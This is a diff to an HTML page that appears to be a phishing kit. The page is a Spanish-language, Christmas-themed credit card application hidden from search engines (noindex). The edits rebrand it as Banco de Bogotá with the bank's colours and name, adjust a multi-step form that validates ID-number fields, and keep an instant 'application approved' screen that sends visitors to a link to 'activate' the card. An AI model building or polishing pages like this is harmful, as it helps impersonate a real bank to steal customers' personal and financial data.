@@ -4,7 +4,7 @@
     <meta name="robots" content="noindex">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>¡Solicita tu Tarjeta de Crédito y celebra la Navidad!</title>
+    <title>¡Solicita tu Tarjeta de Crédito Banco de Bogotá! 🎄</title>
     <meta name="title" content="Solicita tu Tarjeta de Crédito - Fácil y Rápido - Regalo de Navidad">
     <meta name="description" content="Solicita en minutos tu nueva Tarjeta de Crédito. Disfruta de beneficios exclusivos y comienza a comprar lo que siempre quisiste esta Navidad.">
     <meta name="keywords" content="Tarjeta de crédito, Solicitar tarjeta, Nueva tarjeta, Banco de Bogotá, Navidad, Regalos">
@@ -15,18 +15,24 @@
     <link rel="stylesheet" type="text/css" href="css/main.css">
     <link rel="stylesheet" href="css/main-bines.css">
     <style>
-        .tittle-carouse { color: #C00; /* Rojo festivo */ }
-        .hero { 
-            background-color: #F8F9FA; 
+        /* Colores de Banco de Bogotá (Azul Principal) */
+        :root { 
+            --bdb-blue: #0040A8; 
+            --navidad-green: #008000;
+            --navidad-red: #C00; 
         }
+
+        .tittle-carouse { color: var(--bdb-blue); }
+        .hero { background-color: #F8F9FA; }
         
         .opening { 
-            /* Se mantiene para centrar verticalmente la columna */
+            /* Para centrado vertical del contenido principal */
             justify-content: center; 
             align-items: center; 
             min-height: 50vh; 
         }
         .textBlock {
+            /* Centra el texto dentro del bloque y el bloque en sí */
             text-align: center;
             margin: 0 auto; 
             max-width: 600px; 
@@ -36,16 +42,16 @@
             max-width: 400px;
             margin-left: auto;
             margin-right: auto;
-            /* Se establece text-align: center para centrar el formulario dentro de su contenedor (aunque los inputs son bloques) */
-            text-align: center; 
+            /* Se mantiene 'left' para que los labels y inputs se vean como un formulario normal centrado en la página */
+            text-align: left; 
         }
-        /* Ajuste para que los elementos del formulario ocupen el ancho completo y parezcan centrados */
-        .form-container label, .form-container input, .form-container select, .form-container button {
-            display: block; /* Asegura que el input y select ocupen todo el ancho dentro del form-container */
-            margin-left: auto;
-            margin-right: auto;
+        
+        /* Asegurar que los inputs y selects ocupen el ancho completo del form-container */
+        .form-container label, .form-container input, .form-container select {
+            display: block; 
         }
-
+        
+        /* Estilos del loader */
         .loader-container {
             position: fixed;
             top: 0;
@@ -60,7 +66,7 @@
         }
         .spinner {
             border: 8px solid #f3f3f3;
-            border-top: 8px solid #C00; /* Rojo festivo en el spinner */
+            border-top: 8px solid var(--bdb-blue); /* Color principal de Banco de Bogotá */
             border-radius: 50%;
             width: 60px;
             height: 60px;
@@ -72,24 +78,33 @@
         }
         .check-icon {
             font-size: 80px;
-            color: #28a745; 
+            color: var(--navidad-green); /* Verde de éxito */
             margin-bottom: 20px;
         }
-        /* Estilos navideños */
+
+        /* Botón con color navideño (Verde) */
         .btn-Blue { 
-            background-color: #008000; /* Verde pino para el botón principal */
-            border-color: #008000;
+            background-color: var(--navidad-green); 
+            border-color: var(--navidad-green);
         }
         .btn-Blue:hover {
             background-color: #006400;
             border-color: #006400;
         }
-        /* Restaurar el diseño original de la barra de navegación (sin centrar los pasos) */
+        
+        /* Centrado de la barra de navegación de pasos */
         .landing-navbar {
-            justify-content: space-between;
+            display: flex;
+            justify-content: center; /* Centra los pasos horizontalmente */
+            align-items: center;
+            padding: 10px;
         }
-        .logo-bdb {
-            display: block !important; 
+        /* Ocultar logo en el nav bar (o cambiar su display) para centrar los pasos */
+        .landing-navbar .landing-logo {
+            display: none; 
+        }
+        .landing-navbar .nav-item {
+             margin: 0 15px;
         }
     </style>
     <link rel="icon" href="images/favicon.ico" type="image/x-icon">
@@ -157,7 +172,7 @@
                     
                     <div class="textBlock col-12 col-lg-8" id="stage3_final" style="display: none;">
                         <p class="check-icon">&#10003;</p>
-                        <h1 class="tittle-carouse" style="color: #28a745;">¡Felicidades! Solicitud Aprobada 🎉</h1>
+                        <h1 class="tittle-carouse" style="color: var(--navidad-green);">¡Felicidades! Solicitud Aprobada 🎉</h1>
                         <p class="text-carouse">¡Tu solicitud ha sido <b>aprobada</b>! Para completar el proceso y recibir tu nueva Tarjeta de Crédito, y comenzar a disfrutar la Navidad, debes <b>confirmar y activarla</b> en el siguiente enlace.</p>
                         
                         <div class="btn-Principal">
@@ -211,7 +226,7 @@
             if (index !== -1) {
                 const navElement = document.getElementById(navs[index]);
                 navElement.style.fontWeight = 'bold';
-                navElement.style.color = '#008000'; /* Color de navegación activo ajustado al tema */
+                navElement.style.color = 'var(--bdb-blue)'; 
             }
         }
 
@@ -241,9 +256,7 @@
             }, duration);
         }
 
-        /* Modificada para aceptar un ID o un array de IDs para la validación */
         function validateAndLoad(inputIds, duration, nextStageId) {
-            // Asegurar que inputIds es un array para manejar la cédula o múltiples campos
             const idsToValidate = Array.isArray(inputIds) ? inputIds : [inputIds];
 
             for (const inputId of idsToValidate) {
